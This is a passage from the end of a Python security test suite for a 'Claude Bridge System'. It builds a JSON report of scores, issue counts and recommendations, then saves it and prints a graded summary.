                "security_score": round(security_score, 2),
                "overall_risk_level": risk_level
            },
            "issue_breakdown": {
                "critical": len(critical_issues),
                "high": len(high_issues),
                "medium": len(medium_issues),
                "low": len(low_issues)
            },
            "critical_findings": [
                {
                    "test": issue.test_name,
                    "category": issue.test_category,
                    "findings": issue.findings,
                    "recommendations": issue.recommendations
                }
                for issue in critical_issues
            ],
            "test_categories": {
                category: {
                    "total_tests": len(results),
                    "passed": sum(1 for r in results if r.passed),
                    "failed": sum(1 for r in results if not r.passed)
                }
                for category, results in categories.items()
            },
            "recommendations": unique_recommendations[:10],  # Top 10 recommendations
            "detailed_results": [asdict(result) for result in self.results]
        }
        
        return report

def main():
    """Run security test suite"""
    print("🔒 Starting Claude Bridge System Security Test Suite")
    print("=" * 60)
    
    # Create and run security tests
    test_suite = SecurityTestSuite()
    
    try:
        results = test_suite.run_all_tests()
        
        # Save results to file
        output_file = "/tmp/claude_bridge_security_results.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n🔒 Security Test Results Summary:")
        print("=" * 50)
        print(f"Total Tests: {results['security_summary']['total_tests']}")
        print(f"Tests Passed: {results['security_summary']['tests_passed']}")
        print(f"Tests Failed: {results['security_summary']['tests_failed']}")
        print(f"Security Score: {results['security_summary']['security_score']:.1f}%")
        print(f"Risk Level: {results['security_summary']['overall_risk_level']}")
        
        print(f"\n🚨 Issue Breakdown:")
        issues = results['issue_breakdown']
        print(f"   Critical: {issues['critical']}")
        print(f"   High: {issues['high']}")
        print(f"   Medium: {issues['medium']}")
        print(f"   Low: {issues['low']}")
        
        if results['critical_findings']:
            print(f"\n⚠️ Critical Security Issues:")
            for i, finding in enumerate(results['critical_findings'], 1):
                print(f"   {i}. {finding['test']}: {finding['findings'][0] if finding['findings'] else 'No details'}")
        
        print(f"\n💡 Top Security Recommendations:")
        for i, rec in enumerate(results['recommendations'][:5], 1):
            print(f"   {i}. {rec}")
        
        print(f"\n📁 Full results saved to: {output_file}")
        
        # Overall assessment
        if results['security_summary']['security_score'] >= 90:
            print("✅ Security assessment: EXCELLENT")
        elif results['security_summary']['security_score'] >= 75:
            print("⚠️ Security assessment: GOOD")
        elif results['security_summary']['security_score'] >= 60:
            print("⚠️ Security assessment: NEEDS IMPROVEMENT")
        else:
            print("❌ Security assessment: CRITICAL ISSUES FOUND")
        
        return True
        
    except Exception as e:
        print(f"❌ Security test suite failed: {e}")
        return False

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)